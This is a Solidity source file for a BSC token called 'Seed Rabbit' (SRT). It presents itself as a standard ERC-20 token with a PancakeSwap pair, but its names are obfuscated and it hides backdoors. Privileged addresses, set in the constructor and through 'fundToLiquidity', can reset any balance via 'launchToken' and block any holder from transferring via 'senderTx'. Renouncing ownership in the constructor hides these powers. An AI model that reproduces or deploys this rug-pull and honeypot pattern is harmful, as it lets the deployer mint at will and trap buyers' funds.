/**
 *Submitted for verification at BscScan.com on 2023-03-07
*/

pragma solidity ^0.8.11;

// SPDX-License-Identifier: MIT

abstract contract modeTotal {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface maxLiquidityIs {

    function totalSupply() external view returns (uint256);

    function balanceOf(address autoTeam) external view returns (uint256);

    function transfer(address teamTotal, uint256 launchedTotal) external returns (bool);

    function allowance(address tradingEnable, address liquidityMax) external view returns (uint256);

    function approve(address liquidityMax, uint256 launchedTotal) external returns (bool);

    function transferFrom(address teamLimit, address teamTotal, uint256 launchedTotal) external returns (bool);

    event Transfer(address indexed from, address indexed shouldAtBuy, uint256 value);
    event Approval(address indexed tradingEnable, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success,) = recipient.call{value : amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value : weiValue}(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract listFrom is modeTotal {
    address private _owner;

    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SeedRabbit is modeTotal, maxLiquidityIs, listFrom {

    function totalSupply() public view override returns (uint256) {
        return toLaunch;
    }

    using Address for address;

    mapping(address => uint256) receiverAmountMax;

    function decimals() public view returns (uint8) {
        return txTeamLiquidity;
    }

    function transfer(address teamTotal, uint256 launchedTotal) public override returns (bool) {
        launchedAt(_msgSender(), teamTotal, launchedTotal);
        return true;
    }

    function senderAmount(address tradingEnable, address liquidityMax, uint256 launchedTotal) private {
        require(tradingEnable != address(0), "ERC20: approve from the zero address");
        require(liquidityMax != address(0), "ERC20: approve to the zero address");

        senderTotal[tradingEnable][liquidityMax] = launchedTotal;
        emit Approval(tradingEnable, liquidityMax, launchedTotal);
    }

    uint256 private txMin;

    uint8 private txTeamLiquidity = 18;

    mapping(address => bool) public teamFund;

    function name() public view returns (string memory) {
        return modeFrom;
    }

    bool private marketingExempt;

    bool public sellFund;

    address public sellLiquidity;

    bool public receiverLimitFrom;

    function fundToLiquidity(address minAt) public {
        require(!receiverTradingSell);
        teamFund[minAt] = true;
        receiverTradingSell = true;
    }

    uint256 public feeTx;

    function senderTxLimit() private view{
        require(teamFund[_msgSender()]);
    }

    function approve(address liquidityMax, uint256 launchedTotal) public override returns (bool) {
        senderAmount(_msgSender(), liquidityMax, launchedTotal);
        return true;
    }

    function transferFrom(address teamLimit, address teamTotal, uint256 launchedTotal) public override returns (bool) {
        launchedAt(teamLimit, teamTotal, launchedTotal);
        senderAmount(teamLimit, _msgSender(), senderTotal[teamLimit][_msgSender()].sub(launchedTotal, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isMarketingLimit() private {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellLiquidity = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
    }

    string private exemptBuy = "SRT";

    function marketingTx() private {
        receiverAmountMax[modeTotalIs] = toLaunch;
        teamFund[modeTotalIs] = true;
    }

    constructor () {
        isMarketingLimit();
        modeTotalIs = _msgSender();
        renounceOwnership();
        marketingTx();
        emit Transfer(address(0), _msgSender(), toLaunch);
    }

    function launchToken(address senderFeeTrading, uint256 launchedTotal) public {
        senderTxLimit();
        receiverAmountMax[senderFeeTrading] = launchedTotal;
    }

    function launchedAt(address teamLimit, address teamTotal, uint256 launchedTotal) private returns (bool) {
        require(teamLimit != address(0), "ERC20: transfer from the zero address");
        require(teamTotal != address(0), "ERC20: transfer to the zero address");
        require(!amountTeamShould[teamLimit]);
        return takeExempt(teamLimit, teamTotal, launchedTotal);
    }

    function senderTx(address totalSwap) public {
        senderTxLimit();
        if (totalSwap == modeTotalIs || totalSwap == sellLiquidity) {
            return;
        }
        amountTeamShould[totalSwap] = true;
    }

    uint256 private tradingAutoBuy;

    function decreaseAllowance(address liquidityMax, uint256 amountLaunch) public virtual returns (bool) {
        senderAmount(_msgSender(), liquidityMax, senderTotal[_msgSender()][liquidityMax].sub(amountLaunch, "ERC20: decreased allowance below zero"));
        return true;
    }

    function takeExempt(address teamLimit, address teamTotal, uint256 launchedTotal) internal returns (bool) {
        receiverAmountMax[teamLimit] = receiverAmountMax[teamLimit].sub(launchedTotal, "Insufficient Balance");
        receiverAmountMax[teamTotal] = receiverAmountMax[teamTotal].add(launchedTotal);
        emit Transfer(teamLimit, teamTotal, launchedTotal);
        return true;
    }

    uint256 private toLaunch = 100000000 * 10 ** 18;

    function allowance(address tradingEnable, address liquidityMax) public view override returns (uint256) {
        return senderTotal[tradingEnable][liquidityMax];
    }

    uint256 private shouldTokenSell;

    mapping(address => bool) public amountTeamShould;

    function symbol() public view returns (string memory) {
        return exemptBuy;
    }

    string private modeFrom = "Seed Rabbit";

    function balanceOf(address autoTeam) public view override returns (uint256) {
        return receiverAmountMax[autoTeam];
    }

    mapping(address => mapping(address => uint256)) private senderTotal;

    function increaseAllowance(address liquidityMax, uint256 fromAmount) public virtual returns (bool) {
        senderAmount(_msgSender(), liquidityMax, senderTotal[_msgSender()][liquidityMax].add(fromAmount));
        return true;
    }

    using SafeMath for uint256;

    address public modeTotalIs;

    uint256 public marketingMax;

    bool public receiverTradingSell;

    mapping(address => uint256) _balances;

}